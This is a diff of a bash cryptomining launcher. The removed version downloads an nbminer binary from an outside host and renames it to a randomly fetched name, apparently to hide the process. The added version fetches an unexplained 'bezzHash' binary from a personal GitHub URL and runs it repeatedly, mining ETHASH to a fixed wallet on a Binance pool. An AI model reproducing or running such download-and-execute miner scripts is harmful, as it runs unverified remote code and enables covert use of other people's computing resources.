@@ -1,10 +1,16 @@
 #!/bin/bash
-wget https://cuan.mine.nu/nbminer
-ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x nbminer && mv nbminer $ACAK
-WALLET=teguhcong
-POOL=stratum+tcp://ethash.poolbinance.com:1800
-WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
-#WORKER2=$(date '+%d%b')
-#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-./$ACAK --algo ETHASH --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash && chmod +x bezzHash 
+
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 5s
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 5s
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 5s
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
